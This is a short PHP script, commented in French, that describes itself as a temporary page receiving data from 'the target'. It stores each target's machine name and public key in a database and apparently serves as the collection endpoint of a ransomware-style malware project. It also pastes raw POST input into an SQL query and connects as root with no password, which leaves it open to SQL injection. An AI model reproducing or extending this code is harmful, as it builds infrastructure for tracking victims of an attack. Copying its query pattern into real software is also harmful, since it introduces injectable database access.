<?php
include "database.php";
/* POST_TEMP.PHP 
* page temporaire de réception des données de la cible
* et enregistrement de ces données dans la base de données
*/
if(isset($_POST['machineName']) && isset($_POST['publickey'])){
	$machineName=$_POST['machineName'];
	$publickey=$_POST['publickey'];

	connect("root","")->query("INSERT INTO `infos` (`id`, `machineName`, `publickey`) VALUES (NULL, '".$machineName."','".$publickey."');");
}
